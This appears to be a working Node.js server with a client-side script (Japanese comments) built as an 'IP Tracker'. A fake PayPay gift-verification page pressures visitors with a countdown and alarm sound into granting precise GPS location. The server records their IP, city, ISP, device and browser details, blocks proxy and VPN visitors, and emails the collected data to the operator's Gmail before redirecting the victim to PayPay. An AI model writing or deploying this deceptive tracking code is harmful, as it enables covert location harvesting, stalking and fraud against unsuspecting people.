// server.js（統合版）
require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const crypto = require('crypto');
const uaParser = require('ua-parser-js');
const fetch = require('node-fetch');
const app = express();

app.use(express.static('public'));
app.use(express.json());

const validTokens = new Set();

// トークン発行
app.get('/token', (req, res) => {
  const token = crypto.randomBytes(16).toString('hex');
  validTokens.add(token);
  setTimeout(() => validTokens.delete(token), 300000);
  res.json({ token });
});

// 通報API
app.post('/report', async (req, res) => {
  const token = req.headers['authorization'];
  if (!token || !validTokens.has(token)) return res.status(403).json({ error: '不正トークン' });
  validTokens.delete(token);

  const ip = (req.headers['x-forwarded-for'] || req.socket.remoteAddress).split(',')[0].trim();
  const ua = uaParser(req.headers['user-agent']);
  const { latitude, longitude } = req.body;
  const locationLink = `https://maps.google.com?q=${latitude},${longitude}`;

  let geo = {};
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,isp,proxy,hosting,mobile`);
    geo = await response.json();
  } catch (e) {
    console.error('Geoエラー:', e);
  }

  if (geo.proxy || geo.hosting) {
    return res.status(403).json({ redirect: '/warning.html' });
  }

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS
    }
  });

  const mailOptions = {
    from: `IP Tracker <${process.env.GMAIL_USER}>`,
    to: process.env.GMAIL_USER,
    subject: '📡 アクセス通知（統合版）',
    text: `
IPアドレス: ${ip}
国: ${geo.country || '不明'}
地域: ${geo.regionName || '不明'}
市区町村: ${geo.city || '不明'}
ISP: ${geo.isp || '不明'}
緯度/経度: ${latitude} / ${longitude}
Google Maps: ${locationLink}
端末種別: ${ua.device.type || 'PC'}
端末ベンダー: ${ua.device.vendor || '不明'}
端末モデル: ${ua.device.model || '不明'}
OS: ${ua.os.name} ${ua.os.version}
ブラウザ: ${ua.browser.name} ${ua.browser.version}
リファラー: ${req.headers['referer'] || 'なし'}
時間: ${new Date().toLocaleString()}
    `
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log('✅ Gmail送信成功');
  } catch (err) {
    console.error('❌ Gmail送信失敗:', err);
  }

  res.sendStatus(200);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`📡 Listening on http://localhost:${PORT}`));

async function verifyLocation() {
  try {
    const tokenRes = await fetch('/token');
    const { token } = await tokenRes.json();

    if (!navigator.geolocation) {
      alert("この端末では位置情報が使用できません。");
      localStorage.setItem('robot', 'true');
      location.reload();
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async pos => {
        clearInterval(countdownInterval);
        document.getElementById('alertSound').pause();

        await fetch('/report', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': token
          },
          body: JSON.stringify({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude
          })
        });

        alert("本人確認が完了しました。ギフトを受け取ります。");
        location.href = "https://paypay.ne.jp/";
      },
      err => {
        alert("⚠️ 位置情報が拒否されたため、ギフトを受け取ることができません。");
        localStorage.setItem('robot', 'true');
        location.reload();
      }
    );
  } catch (err) {
    alert("通信エラーが発生しました。");
    console.error(err);
  }
}
